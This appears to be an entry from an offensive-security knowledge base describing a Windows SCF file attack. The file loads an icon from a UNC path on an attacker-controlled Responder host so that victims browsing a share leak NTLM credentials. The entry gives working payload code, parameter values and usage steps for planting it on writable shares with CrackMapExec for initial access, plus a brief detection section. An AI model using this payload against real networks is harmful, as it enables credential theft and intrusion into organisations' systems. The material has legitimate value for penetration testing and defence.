---
id: b63d10b7-98cf-4e64-a41f-679b0413e705
name: SCF-File-for-Remote-Icon-Load-and-Desktop-Toggle
type: code
language: ini
verified: true
created_at: '2023-04-06T03:56:03.381517+00:00'
updated_at: '2023-04-10T20:26:21.379228+00:00'
platforms:
  - Windows
tags:
  - scf-payload
  - client-execution
validated: true
---

# SCF-File-for-Remote-Icon-Load-and-Desktop-Toggle

## Code

```ini
[Shell]
Command=2
IconFile=\\$RESPONDER_IP\Share\test.ico
[Taskbar]
Command=ToggleDesktop
```

## Description

This SCF file configuration exploits Windows Explorer by loading a remote icon from a UNC path, triggering NTLM authentication to the specified server (Responder). The Command=2 executes a shell action, and ToggleDesktop hides the desktop during load for stealth.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $RESPONDER_IP | Attacker's IP running Responder/SMB server | 192.168.1.100 |
| test.ico | Remote icon file (can be dummy) | Any .ico on share |

## Usage

Save as .scf file and place on writable SMB share using CrackMapExec or manual copy. When victim browses share in Explorer, it auto-loads the icon, sending NTLM to attacker. Use in AD environments for initial access.

## Detection

- Monitor for SCF file creation on shares via file auditing.
- EDR alerts on WebClient service UNC resolutions to internal IPs.
- Network logs showing SMB auth from Explorer.exe to unexpected hosts.

## Related

- [[procedures/SCF-and-URL-File-Attack-Against-Writable-Share]]
- [[tools/Responder]]
